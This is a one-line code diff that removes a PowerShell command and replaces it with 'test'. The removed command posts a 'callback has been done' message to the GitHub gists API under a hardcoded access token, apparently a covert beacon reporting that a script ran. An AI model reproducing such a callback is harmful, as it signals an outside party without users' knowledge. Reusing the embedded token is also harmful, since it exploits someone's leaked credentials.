@@ -1,1 +1,1 @@
-$output = "callback has been done"; $body = @{description="Callback Notification"; public=$false; files=@{"callback.txt"=@{content=$output}}} | ConvertTo-Json -Depth 3; Invoke-WebRequest -Uri "https://api.github.com/gists" -Headers @{Authorization="token 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"; "User-Agent"="Mozilla/5.0"} -Method POST -Body $body
+test
